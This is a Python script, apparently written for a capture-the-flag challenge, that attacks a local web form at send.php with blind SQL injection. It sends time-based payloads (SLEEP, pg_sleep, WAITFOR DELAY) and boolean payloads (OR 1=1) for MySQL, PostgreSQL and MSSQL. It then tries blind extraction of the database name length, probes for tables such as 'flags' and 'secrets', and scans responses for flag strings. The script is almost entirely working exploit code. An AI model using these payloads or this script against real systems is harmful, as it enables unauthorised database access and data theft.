import requests
import time
import sys

base_url = "http://127.0.0.1:32826/send.php"

# Parameters to test
parameters = ["fullname", "email", "phone", "subject", "message"]

# Time-based payloads for different DBMS
time_payloads = {
    "mysql": "' OR SLEEP(5)-- ",
    "postgres": "' OR pg_sleep(5)-- ",
    "mssql": "' WAITFOR DELAY '0:0:5'-- "
}

# Boolean-based payloads for testing
boolean_payloads = {
    "true": "' OR 1=1-- ",
    "false": "' OR 1=2-- "
}

# Common flag table names to check
flag_tables = ["flags", "flag", "secret", "secrets", "ctf_flags", "challenges"]

# Function to test time-based injection

def test_time_injection(param, payload):
    data = {p: "test" for p in parameters}
    data[param] = payload
    
    print(f"\n[*] Testing time-based injection on parameter: {param}")
    print(f"[*] Payload: {payload}")
    
    start_time = time.time()
    try:
        response = requests.post(base_url, data=data, timeout=15)
        elapsed = time.time() - start_time
        print(f"[+] Response time: {elapsed:.2f} seconds | Status: {response.status_code}")
        
        if elapsed >= 4.5:  # Threshold for detection
            print(f"[!] POTENTIAL TIME-BASED SQL INJECTION on '{param}' - Delay detected!")
            return True, elapsed, response.text
        else:
            print(f"[-] No significant delay detected")
            return False, elapsed, response.text
    except Exception as e:
        elapsed = time.time() - start_time
        print(f"[-] Error or timeout: {str(e)} | Time: {elapsed:.2f}s")
        return False, elapsed, str(e)

# Function to test boolean-based injection
def test_boolean_injection(param):
    data_base = {p: "test" for p in parameters}
    
    print(f"\n[*] Testing boolean-based injection on parameter: {param}")
    
    # Test false condition
    data_false = data_base.copy()
    data_false[param] = boolean_payloads["false"]
    
    try:
        resp_false = requests.post(base_url, data=data_false, timeout=10)
        false_content = resp_false.text
        false_length = len(false_content)
        print(f"[+] False payload response length: {false_length}")
    except Exception as e:
        print(f"[-] Error with false payload: {e}")
        return False, None, None
    
    # Test true condition
    data_true = data_base.copy()
    data_true[param] = boolean_payloads["true"]
    
    try:
        resp_true = requests.post(base_url, data=data_true, timeout=10)
        true_content = resp_true.text
        true_length = len(true_content)
        print(f"[+] True payload response length: {true_length}")
    except Exception as e:
        print(f"[-] Error with true payload: {e}")
        return False, None, None
    
    # Check for differences
    if true_length != false_length or true_content != false_content:
        print(f"[!] BOOLEAN-BASED SQL INJECTION DETECTED on '{param}' - Response differences found!")
        return True, resp_true.text, resp_false.text
    else:
        print(f"[-] No significant difference in responses")
        return False, resp_true.text, resp_false.text

# Function to search for flags in response
def search_flags(text, source):
    import re
    flags = re.findall(r'FLAG\{[^}]+\}', text, re.IGNORECASE)
    if flags:
        print(f"\n[!] FLAG FOUND in {source}:")
        for flag in flags:
            print(f"[!] {flag}")
        return flags
    return []

# Main testing
print("=" * 60)
print("BLIND SQL INJECTION TESTING TOOL")
print(f"Target: {base_url}")
print("=" * 60)

# First, test each parameter with time-based payloads
vulnerable_params = []

for param in parameters:
    print("\n" + "="*60)
    for db_type, payload in time_payloads.items():
        is_vuln, elapsed, response_text = test_time_injection(param, payload)
        
        # Also search for flags in response
        flags = search_flags(response_text, f"{param} - {db_type} payload response")
        if flags:
            print(f"[!] FLAG found during injection test!")
        
        # Save vulnerable parameter
        if is_vuln:
            vulnerable_params.append((param, db_type, payload, elapsed))
            break  # Move to next parameter if one payload works

# Summary of time-based findings
print("\n" + "="*60)
print("TIME-BASED INJECTION SUMMARY")
print("="*60)
if vulnerable_params:
    print(f"[!] Found {len(vulnerable_params)} potentially vulnerable parameter(s):")
    for param, db_type, payload, elapsed in vulnerable_params:
        print(f"  - {param} ({db_type}) - Delay: {elapsed:.2f}s")
else:
    print("[-] No time-based injection vulnerabilities detected")

# Test boolean-based injection on all parameters
print("\n" + "="*60)
print("BOOLEAN-BASED INJECTION TESTING")
print("="*60)

for param in parameters:
    is_bool_vuln, true_resp, false_resp = test_boolean_injection(param)
    
    # Search both responses for flags
    search_flags(true_resp, f"{param} - true condition")
    search_flags(false_resp, f"{param} - false condition")
    
    if is_bool_vuln:
        vulnerable_params.append((param, "boolean", "N/A", 0))

# If vulnerabilities found, attempt blind extraction
if vulnerable_params:
    print("\n" + "="*60)
    print("ATTEMPTING BLIND DATA EXTRACTION")
    print("="*60)
    
    for param, db_type, payload, elapsed in vulnerable_params:
        print(f"\n[*] Attempting extraction on: {param} ({db_type})")
        
        # Try to extract database name length using blind technique
        if db_type == "mysql":
            extraction_payload = "' OR IF(LENGTH(DATABASE())={}, SLEEP(3), 0)-- "
        elif db_type == "postgres":
            extraction_payload = "' OR CASE WHEN LENGTH(CURRENT_DATABASE())={} THEN pg_sleep(3) ELSE pg_sleep(0) END-- "
        elif db_type == "mssql":
            extraction_payload = "' IF LEN(DB_NAME())={} WAITFOR DELAY '0:0:3'-- "
        else:
            extraction_payload = None
        
        if extraction_payload:
            print(f"[*] Testing database name length...")
            for length in range(1, 21):
                test_payload = extraction_payload.format(length)
                data = {p: "test" for p in parameters}
                data[param] = test_payload
                
                start_time = time.time()
                try:
                    response = requests.post(base_url, data=data, timeout=10)
                    elapsed_test = time.time() - start_time
                    
                    if elapsed_test >= 2.5:
                        print(f"[!] Database name length: {length}")
                        break
                except:
                    continue
        
        # Try to check for common flag tables
        print(f"[*] Checking for common flag tables...")
        for table in flag_tables:
            if db_type == "mysql":
                check_payload = f"' OR IF(EXISTS(SELECT 1 FROM {table}), SLEEP(2), 0)-- "
            elif db_type == "postgres":
                check_payload = f"' OR CASE WHEN EXISTS(SELECT 1 FROM {table}) THEN pg_sleep(2) ELSE pg_sleep(0) END-- "
            elif db_type == "mssql":
                check_payload = f"' IF EXISTS(SELECT 1 FROM {table}) WAITFOR DELAY '0:0:2'-- "
            else:
                check_payload = f"' OR 1=(SELECT COUNT(*) FROM {table})-- "
            
            data = {p: "test" for p in parameters}
            data[param] = check_payload
            
            start_time = time.time()
            try:
                response = requests.post(base_url, data=data, timeout=10)
                elapsed_test = time.time() - start_time
                
                if elapsed_test >= 1.5 or (db_type == "boolean" and len(response.text) > 100):
                    print(f"[!] Found table: {table}")
                    
                    # Try to extract from this table
                    if db_type == "mysql":
                        extract_payload = f"' OR IF(EXISTS(SELECT flag FROM {table}), SLEEP(3), 0)-- "
                    elif db_type == "postgres":
                        extract_payload = f"' OR CASE WHEN EXISTS(SELECT flag FROM {table}) THEN pg_sleep(3) ELSE pg_sleep(0) END-- "
                    elif db_type == "mssql":
                        extract_payload = f"' IF EXISTS(SELECT flag FROM {table}) WAITFOR DELAY '0:0:3'-- "
                    else:
                        extract_payload = f"' OR (SELECT COUNT(flag) FROM {table})>0-- "
                    
                    data_extract = {p: "test" for p in parameters}
                    data_extract[param] = extract_payload
                    
                    start_time = time.time()
                    try:
                        resp_extract = requests.post(base_url, data=data_extract, timeout=10)
                        elapsed_extract = time.time() - start_time
                        
                        if elapsed_extract >= 2.5 or (db_type == "boolean" and len(resp_extract.text) > 100):
                            print(f"[!] FLAG may exist in table: {table}")
                            search_flags(resp_extract.text, f"{table} extraction")
                    except:
                        pass
            except:
                continue

print("\n" + "="*60)
print("TESTING COMPLETE")
print("="*60)

